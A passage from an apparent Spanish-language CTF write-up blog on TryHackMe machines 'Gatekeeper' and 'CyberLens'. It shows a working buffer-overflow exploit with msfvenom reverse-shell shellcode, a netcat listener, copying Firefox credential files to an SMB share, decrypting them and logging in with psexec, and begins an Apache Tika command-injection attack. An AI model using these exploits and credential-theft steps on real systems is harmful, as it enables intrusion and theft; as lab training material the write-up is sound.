x2Dx3Dx4Dx5Dx6Dx7Dx8Dx9Dy0Dy1Dy2Dy3Dy4Dy5Dy6Dy7Dy8Dy9Dz0Dz1Dz2Dz3Dz4Dz5Dz6Dz7Dz8Dz9Ea0Ea1Ea2Ea3Ea4Ea5Ea6Ea7Ea8Ea9Eb0Eb1Eb2Eb3Eb4Eb5Eb6Eb7Eb8Eb9Ec0Ec1Ec2Ec3Ec4Ec5Ec6Ec7Ec8Ec9Ed0Ed1Ed2Ed3Ed4Ed5Ed6Ed7Ed8Ed9Ee0Ee1Ee2Ee3Ee4Ee5Ee6Ee7Ee8Ee9Ef0Ef1Ef2Ef3Ef4Ef5Ef6Ef7Ef8Ef9Eg0Eg1Eg2Eg3Eg4Eg5Eg6Eg7Eg8Eg9Eh0Eh1Eh2Eh3Eh4Eh5Eh6Eh7Eh8Eh9Ei0Ei1Ei2Ei3Ei4Ei5Ei6Ei7Ei8Ei9Ej0Ej1Ej2Ej3Ej4Ej5Ej6Ej7Ej8Ej9Ek0Ek1Ek2Ek3Ek4Ek5Ek6Ek7Ek8Ek9El0El1El2El3El4El5El6El7El8El9Em0Em1Em2Em3Em4Em5Em6Em7Em8Em9En0En1En2En3En4En5En6En7En8En9Eo0Eo1Eo2Eo3Eo4Eo5Eo6Eo7Eo8Eo9Ep0Ep1Ep2Ep3Ep4Ep5Ep6Ep7Ep8Ep9Eq0Eq1Eq2Eq3Eq4Eq5Eq6Eq7Eq8Eq9Er0Er1Er2Er3Er4Er5Er6Er7Er8Er9Es0Es1Es2Es3Es4Es5Es6Es7Es8Es9Et0Et1Et2Et3Et4Et5Et6Et7Et8Et9Eu0Eu1Eu2Eu3Eu4Eu5Eu6Eu7Eu8Eu9Ev0Ev1Ev2Ev3Ev4Ev5Ev6Ev7Ev8Ev9Ew0Ew1Ew2Ew3Ew4Ew5Ew6Ew7Ew8Ew9Ex0Ex1Ex2Ex3Ex4Ex5Ex6Ex7Ex8Ex9Ey0Ey1Ey2Ey3Ey4Ey5Ey6Ey7Ey8Ey9Ez0Ez1Ez2Ez3Ez4Ez5Ez6Ez7Ez8Ez9Fa0Fa1Fa2Fa3Fa4Fa5Fa6Fa7Fa8Fa9Fb0Fb1Fb2Fb3Fb4Fb5Fb6Fb7Fb8Fb9Fc0Fc1Fc2Fc3Fc4Fc5Fc6Fc7Fc8Fc9Fd0Fd1Fd2Fd3Fd4Fd5Fd6Fd7Fd8Fd9Fe0Fe1Fe2Fe3Fe4Fe5Fe6Fe7Fe8Fe9Ff0Ff1Ff2Ff3Ff4Ff5Ff6Ff7Ff8Ff9Fg0Fg1Fg2Fg3Fg4Fg5Fg6Fg7Fg8Fg9Fh0Fh1Fh2Fh3Fh4Fh5Fh6Fh7Fh8Fh9Fi0Fi1Fi2Fi3Fi4Fi5Fi6Fi7Fi8Fi9Fj0Fj1Fj2Fj3Fj4Fj5Fj6Fj7Fj8Fj9Fk0Fk1Fk2Fk3Fk4Fk5Fk6Fk7Fk8Fk9Fl0Fl1Fl2Fl3Fl4Fl5Fl6Fl7Fl8Fl9Fm0Fm1Fm2Fm3Fm4Fm5Fm6Fm7Fm8Fm9Fn0Fn1Fn2Fn3Fn4Fn5Fn6Fn7Fn8Fn9Fo0Fo1Fo2Fo3Fo4Fo5Fo6Fo7Fo8Fo9Fp0Fp1Fp2Fp3Fp4Fp5Fp6Fp7Fp8Fp9Fq0Fq1Fq2Fq3Fq4Fq5Fq6Fq7Fq8Fq9Fr0Fr1Fr2Fr3Fr4Fr5Fr6Fr7Fr8Fr9Fs0Fs1Fs2Fs3Fs4Fs5Fs6Fs7Fs8Fs9Ft0Ft1Ft2Ft3Ft4Ft5Ft6Ft7Ft8Ft9Fu0Fu1Fu2Fu3Fu4Fu5Fu6Fu7Fu8Fu9Fv0Fv1Fv2Fv3Fv4Fv5Fv6Fv7Fv8Fv9Fw0Fw1Fw2Fw3Fw4Fw5Fw6Fw7Fw8Fw9Fx0Fx1Fx2Fx3Fx4Fx5Fx6Fx7Fx8Fx9Fy0Fy1Fy2Fy3Fy4Fy5Fy6Fy7Fy8Fy9Fz0Fz1Fz2Fz3Fz4Fz5Fz6Fz7Fz8Fz9Ga0Ga1Ga2Ga3Ga4Ga5Ga6Ga7Ga8Ga9Gb0Gb1Gb2Gb3Gb4Gb5Gb6Gb7Gb8Gb9Gc0Gc1Gc2Gc3Gc4Gc5Gc6Gc7Gc8Gc9Gd0Gd1Gd2Gd3Gd4Gd5Gd6Gd7Gd8Gd9Ge0Ge1Ge2Ge3Ge4Ge5Ge6Ge7Ge8Ge9Gf0Gf1Gf2Gf3Gf4Gf5Gf6Gf7Gf8Gf9Gg0Gg1Gg2Gg3Gg4Gg5Gg6Gg7Gg8Gg9Gh0Gh1Gh2Gh3Gh4Gh5Gh6Gh7Gh8Gh9Gi0Gi1Gi2Gi3Gi4Gi5Gi6Gi7Gi8Gi9Gj0Gj1Gj2Gj3Gj4Gj5Gj6Gj7Gj8Gj9Gk0Gk1Gk2Gk3Gk4Gk5Gk Para que calcule automáticamente el offset, con mona pattern_offset, le pasamos el valor del EIP\n!mona pattern_offset 39654138 Ha encontrado que el offset es de 146, esto significa que tenemos que poner 146 caracteres para conseguir llegar a sobreescribir el EIP\nEl siguiente paso es comprobar si hay algún badchar, para ello creamos una lista de bytes con:\n!mona bytearray -b \u0026#34;\\x00\u0026#34; Vamos a usar el siguiente script para mandar todos los bytes\nfrom pwn import * from struct import pack offset = 146 before_eip = b\u0026#34;A\u0026#34; * offset eip = b\u0026#34;BBBB\u0026#34; badchars = b\u0026#34;\\x01\\x02\\x03\\x04\\x05\\x06\\x07\\x08\\x09\\x0a\\x0b\\x0c\\x0d\\x0e\\x0f\\x10\\x11\\x12\\x13\\x14\\x15\\x16\\x17\\x18\\x19\\x1a\\x1b\\x1c\\x1d\\x1e\\x1f\u0026#34; badchars += b\u0026#34;\\x20\\x21\\x22\\x23\\x24\\x25\\x26\\x27\\x28\\x29\\x2a\\x2b\\x2c\\x2d\\x2e\\x2f\\x30\\x31\\x32\\x33\\x34\\x35\\x36\\x37\\x38\\x39\\x3a\\x3b\\x3c\\x3d\\x3e\\x3f\u0026#34; badchars += b\u0026#34;\\x40\\x41\\x42\\x43\\x44\\x45\\x46\\x47\\x48\\x49\\x4a\\x4b\\x4c\\x4d\\x4e\\x4f\\x50\\x51\\x52\\x53\\x54\\x55\\x56\\x57\\x58\\x59\\x5a\\x5b\\x5c\\x5d\\x5e\\x5f\u0026#34; badchars += b\u0026#34;\\x60\\x61\\x62\\x63\\x64\\x65\\x66\\x67\\x68\\x69\\x6a\\x6b\\x6c\\x6d\\x6e\\x6f\\x70\\x71\\x72\\x73\\x74\\x75\\x76\\x77\\x78\\x79\\x7a\\x7b\\x7c\\x7d\\x7e\\x7f\u0026#34; badchars += b\u0026#34;\\x80\\x81\\x82\\x83\\x84\\x85\\x86\\x87\\x88\\x89\\x8a\\x8b\\x8c\\x8d\\x8e\\x8f\\x90\\x91\\x92\\x93\\x94\\x95\\x96\\x97\\x98\\x99\\x9a\\x9b\\x9c\\x9d\\x9e\\x9f\u0026#34; badchars += b\u0026#34;\\xa0\\xa1\\xa2\\xa3\\xa4\\xa5\\xa6\\xa7\\xa8\\xa9\\xaa\\xab\\xac\\xad\\xae\\xaf\\xb0\\xb1\\xb2\\xb3\\xb4\\xb5\\xb6\\xb7\\xb8\\xb9\\xba\\xbb\\xbc\\xbd\\xbe\\xbf\u0026#34; badchars += b\u0026#34;\\xc0\\xc1\\xc2\\xc3\\xc4\\xc5\\xc6\\xc7\\xc8\\xc9\\xca\\xcb\\xcc\\xcd\\xce\\xcf\\xd0\\xd1\\xd2\\xd3\\xd4\\xd5\\xd6\\xd7\\xd8\\xd9\\xda\\xdb\\xdc\\xdd\\xde\\xdf\u0026#34; badchars += b\u0026#34;\\xe0\\xe1\\xe2\\xe3\\xe4\\xe5\\xe6\\xe7\\xe8\\xe9\\xea\\xeb\\xec\\xed\\xee\\xef\\xf0\\xf1\\xf2\\xf3\\xf4\\xf5\\xf6\\xf7\\xf8\\xf9\\xfa\\xfb\\xfc\\xfd\\xfe\\xff\u0026#34; payload = before_eip + eip + badchars host, port = \u0026#34;192.168.1.142\u0026#34;, \u0026#34;31337\u0026#34; r = remote(host, port) r.sendline(payload) Desde immunity debbuger podemos ver todos los bytes que hemos mandado\nPara comprobar que ningún byte de problemas, usamos !mona compare, donde le pasamos el archivo bytearray.bin que nos creó anteriormente, y también le pasamos la dirección donde empieza la cadena de badchars\n!mona compare -f C:\\Users\\arnau\\Desktop\\bof\\bytearray.bin -a 016319F8 Ha encontrado 2 badchars [\\x00, \\x0a]\nPara explotar el BoF, tenemos que poner en el EIP una dirección de salto al ESP donde va a estar nuestro shellcode\n!mona find -s \u0026#34;\\xFF\\xE4\u0026#34; -m gatekeeper.exe Podemos usar cualquiera de las 2, ya que las dos tienen {PAGE_EXECUTE_READ}\nPor último creamos el shellcode, donde especificamos los badchars que hemos encontrado durante el reconocimiento del programa\nmsfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.150 LPORT=443 --platform windows -a x86 -e x86/shikata_ga_nai -f py -b \u0026#34;\\x00\\x0a\u0026#34; EXITFUNC=thread buf = b\u0026#34;\u0026#34; buf += b\u0026#34;\\xbf\\x4f\\x6e\\xb7\\x71\\xd9\\xc0\\xd9\\x74\\x24\\xf4\\x58\u0026#34; buf += b\u0026#34;\\x29\\xc9\\xb1\\x52\\x31\\x78\\x12\\x03\\x78\\x12\\x83\\x8f\u0026#34; buf += b\u0026#34;\\x6a\\x55\\x84\\xf3\\x9b\\x1b\\x67\\x0b\\x5c\\x7c\\xe1\\xee\u0026#34; buf += b\u0026#34;\\x6d\\xbc\\x95\\x7b\\xdd\\x0c\\xdd\\x29\\xd2\\xe7\\xb3\\xd9\u0026#34; buf += b\u0026#34;\\x61\\x85\\x1b\\xee\\xc2\\x20\\x7a\\xc1\\xd3\\x19\\xbe\\x40\u0026#34; buf += b\u0026#34;\\x50\\x60\\x93\\xa2\\x69\\xab\\xe6\\xa3\\xae\\xd6\\x0b\\xf1\u0026#34; buf += b\u0026#34;\\x67\\x9c\\xbe\\xe5\\x0c\\xe8\\x02\\x8e\\x5f\\xfc\\x02\\x73\u0026#34; buf += b\u0026#34;\\x17\\xff\\x23\\x22\\x23\\xa6\\xe3\\xc5\\xe0\\xd2\\xad\\xdd\u0026#34; buf += b\u0026#34;\\xe5\\xdf\\x64\\x56\\xdd\\x94\\x76\\xbe\\x2f\\x54\\xd4\\xff\u0026#34; buf += b\u0026#34;\\x9f\\xa7\\x24\\x38\\x27\\x58\\x53\\x30\\x5b\\xe5\\x64\\x87\u0026#34; buf += b\u0026#34;\\x21\\x31\\xe0\\x13\\x81\\xb2\\x52\\xff\\x33\\x16\\x04\\x74\u0026#34; buf += b\u0026#34;\\x3f\\xd3\\x42\\xd2\\x5c\\xe2\\x87\\x69\\x58\\x6f\\x26\\xbd\u0026#34; buf += b\u0026#34;\\xe8\\x2b\\x0d\\x19\\xb0\\xe8\\x2c\\x38\\x1c\\x5e\\x50\\x5a\u0026#34; buf += b\u0026#34;\\xff\\x3f\\xf4\\x11\\x12\\x2b\\x85\\x78\\x7b\\x98\\xa4\\x82\u0026#34; buf += b\u0026#34;\\x7b\\xb6\\xbf\\xf1\\x49\\x19\\x14\\x9d\\xe1\\xd2\\xb2\\x5a\u0026#34; buf += b\u0026#34;\\x05\\xc9\\x03\\xf4\\xf8\\xf2\\x73\\xdd\\x3e\\xa6\\x23\\x75\u0026#34; buf += b\u0026#34;\\x96\\xc7\\xaf\\x85\\x17\\x12\\x7f\\xd5\\xb7\\xcd\\xc0\\x85\u0026#34; buf += b\u0026#34;\\x77\\xbe\\xa8\\xcf\\x77\\xe1\\xc9\\xf0\\x5d\\x8a\\x60\\x0b\u0026#34; buf += b\u0026#34;\\x36\\x75\\xdc\\x12\\x50\\x1d\\x1f\\x14\\x5d\\x65\\x96\\xf2\u0026#34; buf += b\u0026#34;\\x37\\x89\\xff\\xad\\xaf\\x30\\x5a\\x25\\x51\\xbc\\x70\\x40\u0026#34; buf += b\u0026#34;\\x51\\x36\\x77\\xb5\\x1c\\xbf\\xf2\\xa5\\xc9\\x4f\\x49\\x97\u0026#34; buf += b\u0026#34;\\x5c\\x4f\\x67\\xbf\\x03\\xc2\\xec\\x3f\\x4d\\xff\\xba\\x68\u0026#34; buf += b\u0026#34;\\x1a\\x31\\xb3\\xfc\\xb6\\x68\\x6d\\xe2\\x4a\\xec\\x56\\xa6\u0026#34; buf += b\u0026#34;\\x90\\xcd\\x59\\x27\\x54\\x69\\x7e\\x37\\xa0\\x72\\x3a\\x63\u0026#34; buf += b\u0026#34;\\x7c\\x25\\x94\\xdd\\x3a\\x9f\\x56\\xb7\\x94\\x4c\\x31\\x5f\u0026#34; buf += b\u0026#34;\\x60\\xbf\\x82\\x19\\x6d\\xea\\x74\\xc5\\xdc\\x43\\xc1\\xfa\u0026#34; buf += b\u0026#34;\\xd1\\x03\\xc5\\x83\\x0f\\xb4\\x2a\\x5e\\x94\\xd4\\xc8\\x4a\u0026#34; buf += b\u0026#34;\\xe1\\x7c\\x55\\x1f\\x48\\xe1\\x66\\xca\\x8f\\x1c\\xe5\\xfe\u0026#34; buf += b\u0026#34;\\x6f\\xdb\\xf5\\x8b\\x6a\\xa7\\xb1\\x60\\x07\\xb8\\x57\\x86\u0026#34; buf += b\u0026#34;\\xb4\\xb9\\x7d\u0026#34; Ahora solo falta ponernos en escucha rlwrap nc -nlvp 443 y modificar el exploit, donde metemos el shellcode creado con msfvenom\nfrom pwn import * from struct import pack offset = 146 before_eip = b\u0026#34;A\u0026#34; * offset eip = pack(\u0026#34;\u0026lt;I\u0026#34;, 0x080416bf) buf = b\u0026#34;\u0026#34; buf += b\u0026#34;\\xbf\\x4f\\x6e\\xb7\\x71\\xd9\\xc0\\xd9\\x74\\x24\\xf4\\x58\u0026#34; buf += b\u0026#34;\\x29\\xc9\\xb1\\x52\\x31\\x78\\x12\\x03\\x78\\x12\\x83\\x8f\u0026#34; buf += b\u0026#34;\\x6a\\x55\\x84\\xf3\\x9b\\x1b\\x67\\x0b\\x5c\\x7c\\xe1\\xee\u0026#34; buf += b\u0026#34;\\x6d\\xbc\\x95\\x7b\\xdd\\x0c\\xdd\\x29\\xd2\\xe7\\xb3\\xd9\u0026#34; buf += b\u0026#34;\\x61\\x85\\x1b\\xee\\xc2\\x20\\x7a\\xc1\\xd3\\x19\\xbe\\x40\u0026#34; buf += b\u0026#34;\\x50\\x60\\x93\\xa2\\x69\\xab\\xe6\\xa3\\xae\\xd6\\x0b\\xf1\u0026#34; buf += b\u0026#34;\\x67\\x9c\\xbe\\xe5\\x0c\\xe8\\x02\\x8e\\x5f\\xfc\\x02\\x73\u0026#34; buf += b\u0026#34;\\x17\\xff\\x23\\x22\\x23\\xa6\\xe3\\xc5\\xe0\\xd2\\xad\\xdd\u0026#34; buf += b\u0026#34;\\xe5\\xdf\\x64\\x56\\xdd\\x94\\x76\\xbe\\x2f\\x54\\xd4\\xff\u0026#34; buf += b\u0026#34;\\x9f\\xa7\\x24\\x38\\x27\\x58\\x53\\x30\\x5b\\xe5\\x64\\x87\u0026#34; buf += b\u0026#34;\\x21\\x31\\xe0\\x13\\x81\\xb2\\x52\\xff\\x33\\x16\\x04\\x74\u0026#34; buf += b\u0026#34;\\x3f\\xd3\\x42\\xd2\\x5c\\xe2\\x87\\x69\\x58\\x6f\\x26\\xbd\u0026#34; buf += b\u0026#34;\\xe8\\x2b\\x0d\\x19\\xb0\\xe8\\x2c\\x38\\x1c\\x5e\\x50\\x5a\u0026#34; buf += b\u0026#34;\\xff\\x3f\\xf4\\x11\\x12\\x2b\\x85\\x78\\x7b\\x98\\xa4\\x82\u0026#34; buf += b\u0026#34;\\x7b\\xb6\\xbf\\xf1\\x49\\x19\\x14\\x9d\\xe1\\xd2\\xb2\\x5a\u0026#34; buf += b\u0026#34;\\x05\\xc9\\x03\\xf4\\xf8\\xf2\\x73\\xdd\\x3e\\xa6\\x23\\x75\u0026#34; buf += b\u0026#34;\\x96\\xc7\\xaf\\x85\\x17\\x12\\x7f\\xd5\\xb7\\xcd\\xc0\\x85\u0026#34; buf += b\u0026#34;\\x77\\xbe\\xa8\\xcf\\x77\\xe1\\xc9\\xf0\\x5d\\x8a\\x60\\x0b\u0026#34; buf += b\u0026#34;\\x36\\x75\\xdc\\x12\\x50\\x1d\\x1f\\x14\\x5d\\x65\\x96\\xf2\u0026#34; buf += b\u0026#34;\\x37\\x89\\xff\\xad\\xaf\\x30\\x5a\\x25\\x51\\xbc\\x70\\x40\u0026#34; buf += b\u0026#34;\\x51\\x36\\x77\\xb5\\x1c\\xbf\\xf2\\xa5\\xc9\\x4f\\x49\\x97\u0026#34; buf += b\u0026#34;\\x5c\\x4f\\x67\\xbf\\x03\\xc2\\xec\\x3f\\x4d\\xff\\xba\\x68\u0026#34; buf += b\u0026#34;\\x1a\\x31\\xb3\\xfc\\xb6\\x68\\x6d\\xe2\\x4a\\xec\\x56\\xa6\u0026#34; buf += b\u0026#34;\\x90\\xcd\\x59\\x27\\x54\\x69\\x7e\\x37\\xa0\\x72\\x3a\\x63\u0026#34; buf += b\u0026#34;\\x7c\\x25\\x94\\xdd\\x3a\\x9f\\x56\\xb7\\x94\\x4c\\x31\\x5f\u0026#34; buf += b\u0026#34;\\x60\\xbf\\x82\\x19\\x6d\\xea\\x74\\xc5\\xdc\\x43\\xc1\\xfa\u0026#34; buf += b\u0026#34;\\xd1\\x03\\xc5\\x83\\x0f\\xb4\\x2a\\x5e\\x94\\xd4\\xc8\\x4a\u0026#34; buf += b\u0026#34;\\xe1\\x7c\\x55\\x1f\\x48\\xe1\\x66\\xca\\x8f\\x1c\\xe5\\xfe\u0026#34; buf += b\u0026#34;\\x6f\\xdb\\xf5\\x8b\\x6a\\xa7\\xb1\\x60\\x07\\xb8\\x57\\x86\u0026#34; buf += b\u0026#34;\\xb4\\xb9\\x7d\u0026#34; print(eip) payload = before_eip + eip + b\u0026#34;\\x90\u0026#34; * 16 + buf host, port = \u0026#34;192.168.1.142\u0026#34;, 31337 r = remote(host, port) r.sendline(payload) Si quieres ver una explotación de un BoF más a detalle te recomiendo que te mires el writeup de la máquina Buff y Brainpan\nEjecutamos el script\u0026hellip;. Y estamos dentro!\nconnect to [192.168.1.150] from (UNKNOWN) [192.168.1.142] 49184 Microsoft Windows [Versi�n 6.1.7601] Copyright (c) 2009 Microsoft Corporation. Reservados todos los derechos. C:\\Users\\arnau\\Desktop\u0026gt; Estamos dentro, sí, pero no de la máquina víctima, sino de mi máquina, así que tenemos que modificar el payload y el exploit con las ip correspondientes de tryhackme.\nCopyright (c) 2009 Microsoft Corporation. All rights reserved. C:\\Users\\natbat\\Desktop\u0026gt; Ahora sí estamos dentro.\nEscalada de privilegios Empezamos con un reconocimiento listando el contenido de: C:\\Users\\natbat\nC:\\Users\\natbat\u0026gt;dir /S /B ... C:\\Users\\natbat\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\ljfn812a.default-release\\key4.db C:\\Users\\natbat\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\ljfn812a.default-release\\logins.json C:\\Users\\natbat\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\ljfn812a.default-release\\minidumps C:\\Users\\natbat\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\ljfn812a.default-release\\parent.lock C:\\Users\\natbat\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\ljfn812a.default-release\\permissions.sqlite C:\\Users\\natbat\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\ljfn812a.default-release\\pkcs11.txt C:\\Users\\natbat\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\ljfn812a.default-release\\places.sqlite C:\\Users\\natbat\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\ljfn812a.default-release\\prefs.js C:\\Users\\natbat\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\ljfn812a.default-release\\protections.sqlite ... Entre todos los archivos me llaman la atención los de los Profiles de firefox, ya que pueden contener credenciales guardadas en el navegador.\nPara extraer las credenciales usaremos: https://github.com/lclevy/firepwd.\nEn el README de la herramienta, explican que para usar este script hay que tener el archivo key4.db o key3.db y logins.json o signons.sqlite\nkey4.db (or key3.db), logins.json (or signons.sqlite). Para pasarnos los archivos de la máquina víctima hacia nuestra máquina, abrimos un servidor samba\nimpacket-smbserver smb $(pwd) C:\\Users\\natbat\u0026gt;copy C:\\Users\\natbat\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\ljfn812a.default-release\\key4.db \\\\10.9.3.29\\smb\\ 1 file(s) copied. C:\\Users\\natbat\u0026gt;copy C:\\Users\\natbat\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\ljfn812a.default-release\\logins.json \\\\10.9.3.29\\smb\\ 1 file(s) copied. Ejecutamos el script de firepwd\n$ python3 firepwd.py .... .... .... https://creds.com:b\u0026#39;mayor\u0026#39;,b\u0026#39;PASS Podemos probar de usar estas credenciales con psexec\npython3 /usr/share/doc/python3-impacket/examples/psexec.py gatekeeper/mayor:PASS@10.10.165.175 cmd.exe Impacket v0.12.0.dev1 - Copyright 2023 Fortra [*] Requesting shares on 10.10.165.175..... [*] Found writable share ADMIN$ [*] Uploading file BrrdIOeQ.exe [*] Opening SVCManager on 10.10.165.175..... [*] Creating service kZEY on 10.10.165.175..... [*] Starting service kZEY..... [!] Press help for extra shell commands Microsoft Windows [Version 6.1.7601] Copyright (c) 2009 Microsoft Corporation. All rights reserved. C:\\Windows\\system32\u0026gt; Estamos dentro!!!!\nMáquina completada :)\n","date":"2024-06-24","id":18,"permalink":"/writeups/tryhackme/gatekeeper/","summary":"A lo largo del análisis de esta máquina, examinamos un binario y explotamos una vulnerabilidad de Buffer Overflow que nos permitió acceder al servidor. Para realizar la escalada de privilegios, extraímos las credenciales almacenadas en Firefox utilizando la herramienta Firepwd.","tags":[],"title":"Gatekeeper"},{"content":"","date":"2024-06-23","id":19,"permalink":"/tags/alwaysinstallelevated/","summary":"","tags":[],"title":"AlwaysInstallElevated"},{"content":"Reconocimiento Para empezar lo primero es comprobar si la máquina está activa y que OS tiene\n$ ping -c 1 10.10.53.55 PING 10.10.53.55 (10.10.53.55) 56(84) bytes of data. 64 bytes from 10.10.53.55: icmp_seq=1 ttl=127 time=42.2 ms --- 10.10.53.55 ping statistics --- 1 packets transmitted, 1 received, 0% packet loss, time 0ms rtt min/avg/max/mdev = 42.175/42.175/42.175/0.000 ms Tenemos conexión y en este caso da un ttl (time to live) de 127, entendiendo que ttl=64: Linux / ttl=128: Windows. Esta máquina es Windows\nEscaneo de puertos Ahora empezamos con un escaneo de puertos\n$ sudo nmap -p- --open -sS --min-rate 5000 -n -Pn -vvv 10.10.53.55 -oG allPorts Explicación parámetros\rParámetro Función -p- Para que el escaneo sea a todos los puertos (65536) \u0026ndash;open Para que solo reporte los puertos abiertos \u0026ndash;min-rate 5000 Definir el tiempo del escaneo -n Omitir resolución DNS -vvv Para que vaya reportando lo que encuentre por consola -Pn Para saltar la comprobación de sí la máquina está activa o no -oG allPorts Para que guarde el escaneo en format grepeable en un archivo llamado allPort Con una función definida en la zshrc llamada extractPorts, nos reporta los puertos abiertos de una forma más visual\nFunción extractPorts de @s4vitar\n\u0026gt; extractPorts allPorts ───────┬──────────────────────────────────────────────────────────────────────────────────────────────────────────────── │ File: extractPorts.tmp ───────┼──────────────────────────────────────────────────────────────────────────────────────────────────────────────── 1 │ 2 │ [*] Extracting information... 3 │ 4 │ [*] IP Address: 10.10.53.55 5 │ [*] Open ports: 80,135,139,445,3389,5985,7680,47001,49664,49665,49666,49667,49668,49669,49670,49677,61777 6 │ 7 │ [*] Ports copied to clipboard 8 │ ───────┴──────────────────────────────────────────────────────────────────────────────────────────────────────────────── Ahora con nmap vamos a intentar buscar las versiones de los servicios que corren por los puertos y ejecutar scripts básicos de reconocimientos de nmap\n\u0026gt; nmap -p80,135,139,445,3389,5985,7680,47001,49664,49665,49666,49667,49668,49669,49670,49677,61777 -sCV 10.10.53.55 -oN versions PORT STATE SERVICE VERSION 80/tcp open http Apache httpd 2.4.57 ((Win64)) |_http-title: CyberLens: Unveiling the Hidden Matrix | http-methods: |_ Potentially risky methods: TRACE |_http-server-header: Apache/2.4.57 (Win64) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds? 3389/tcp open ms-wbt-server Microsoft Terminal Services | ssl-cert: Subject: commonName=CyberLens | Not valid before: 2024-06-22T15:52:11 |_Not valid after: 2024-12-22T15:52:11 |_ssl-date: 2024-06-23T15:59:13+00:00; 0s from scanner time. | rdp-ntlm-info: | Target_Name: CYBERLENS | NetBIOS_Domain_Name: CYBERLENS | NetBIOS_Computer_Name: CYBERLENS | DNS_Domain_Name: CyberLens | DNS_Computer_Name: CyberLens | Product_Version: 10.0.17763 |_ System_Time: 2024-06-23T15:59:02+00:00 5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-title: Not Found |_http-server-header: Microsoft-HTTPAPI/2.0 7680/tcp closed pando-pub 47001/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Not Found 49664/tcp open msrpc Microsoft Windows RPC 49665/tcp open msrpc Microsoft Windows RPC 49666/tcp open msrpc Microsoft Windows RPC 49667/tcp open msrpc Microsoft Windows RPC 49668/tcp open msrpc Microsoft Windows RPC 49669/tcp open msrpc Microsoft Windows RPC 49670/tcp open msrpc Microsoft Windows RPC 49677/tcp open msrpc Microsoft Windows RPC 61777/tcp open http Jetty 8.y.z-SNAPSHOT |_http-server-header: Jetty(8.y.z-SNAPSHOT) |_http-cors: HEAD GET |_http-title: Welcome to the Apache Tika 1.17 Server | http-methods: |_ Potentially risky methods: PUT Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: | smb2-security-mode: | 3:1:1: |_ Message signing enabled but not required | smb2-time: | date: 2024-06-23T15:59:02 |_ start_date: N/A Explicación parámetros\rParámetro Función -p Especificamos los puertos abiertos que hemos encontrado con el escaneo anterior -sC Para que realice scripts básicos de reconocimiento -sV Proporciona la versión e información de los servicios que corren por los puertos Dentro de la web del puerto 80 hay una subida de archivos.\nAl subir un archivo nos muestra sus metadatos.\nSi miramos el código de la web identificamos lo siguiente\ndocument.addEventListener(\u0026#34;DOMContentLoaded\u0026#34;, function() { document.getElementById(\u0026#34;metadataButton\u0026#34;).addEventListener(\u0026#34;click\u0026#34;, function() { var fileInput = document.getElementById(\u0026#34;imageFileInput\u0026#34;); var file = fileInput.files[0]; var reader = new FileReader(); reader.onload = function() { var fileData = reader.result; fetch(\u0026#34;http://cyberlens.thm:61777/meta\u0026#34;, { method: \u0026#34;PUT\u0026#34;, body: fileData, headers: { \u0026#34;Accept\u0026#34;: \u0026#34;application/json\u0026#34;, \u0026#34;Content-Type\u0026#34;: \u0026#34;application/octet-stream\u0026#34; } }) .then(response =\u0026gt; { if (response.ok) { return response.json(); } else { throw new Error(\u0026#34;Error: \u0026#34; + response.status); } }) .then(data =\u0026gt; { var metadataOutput = document.getElementById(\u0026#34;metadataOutput\u0026#34;); metadataOutput.innerText = JSON.stringify(data, null, 2); }) .catch(error =\u0026gt; { console.error(\u0026#34;Error:\u0026#34;, error); }); }; reader.readAsArrayBuffer(file); }); }); Básicamente en el código analizamos que pasa nuestro archivo con el método PUT a http://cyberlens.thm:61777/meta para analizar sus metadatos.\nTenemos un dominio: cyberlens.thm. Asi que lo añadimos al /etc/hosts apuntando a la máquina víctima\nIntrusión Ya podemos entrar a http://cyberlens.thm:61777. Al entrar aparece el siguiente mensaje: *Welcome to the Apache Tika 1.17 Server\nCon una búsqueda con searchsploit identificamos que es una versión vulnerable\nsearchsploit Tika 1.17 ------------------------------------------------------------------- --------------------------------- Exploit Title | Path ------------------------------------------------------------------- --------------------------------- Apache Tika 1.15 - 1.17 - Header Command Injection (Metasploit) | windows/remote/47208.rb Apache Tika-server \u0026lt; 1.18 - Command Injection | windows/remote/46540.py ------------------------------------------------------------------- --------------------------------- Nos pasamos el exploit a nuestro directorio\nsearchsploit -m windows/remote/46540.py Exploit: Apache Tika-server \u0026lt; 1.18 - Command Injection URL: https://www.exploit-db.com/exploits/46540 Path: /usr/share/exploitdb/exploits/windows/remote/46540.py Codes: CVE-2018-1335 Verified: True File Type: Python script, ASCII text executable Copied to: /home/d3bo/Desktop/cyberlens/46540.py Al ejecutarlo da error\npython3 /home/d3bo/Desktop/cyberlens/46540.py File \u0026#34;/home/d3bo/Desktop/cyberlens/46540.py\u0026#34;, line 13 print \u0026#34;Usage: python CVE-2018-1335.py \u0026lt;host\u0026gt; \u0026lt;port\u0026gt; \u0026lt;command\u0026gt;\u0026#34; ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^ SyntaxError: Missing parentheses in call to \u0026#39;print\u0026#39;. Did you mean print(...)? El script hace un print sin paréntesis, esto indica que seguramente está programado en python2\npython2 46540.py Usage: python CVE-2018-1335.py \u0026lt;host\u0026gt; \u0026lt;port\u0026gt; \u0026lt;command\u0026gt; Example: python CVE-2018-1335.py localhost 9998 calc.exe Nos aparece el mensaje explicando como se usa. Para comprobar que podemos hacer un command injection intentaremos colar un ping hacia nuestra máquina, mientras que estamos en escucha por la interfaz tun0 filtrando por icmp, para detectar si nos llegan los pings desde la máquina víctima\nIniciamos tcpdump por la interfaz tun0:\nsudo tcpdump -i tun0 icmp 